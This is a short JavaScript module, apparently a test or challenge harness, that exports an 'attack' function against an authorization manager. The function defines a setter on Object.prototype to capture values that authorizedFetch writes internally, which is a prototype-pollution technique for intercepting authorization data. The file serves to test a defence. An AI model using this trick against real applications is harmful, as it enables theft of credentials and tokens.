const urlExample = "/";

export const attack = (authzManager, success) => {
  try {
    // Let's use the fact that reduce is assigning to an object too!
    Object.defineProperty(Object.prototype, urlExample, {
      get: () => void 0,
      set: (v) => {
        success(v);
      }
    });
  }
  catch (e) {
    console.log(" ok, you win :( \n", e.message);
  }
  authzManager
    .authorizedFetch([
      {
        url: urlExample,
        headers: {}
      }
    ])
    .catch(() => {
      // Do nothing
    });
};
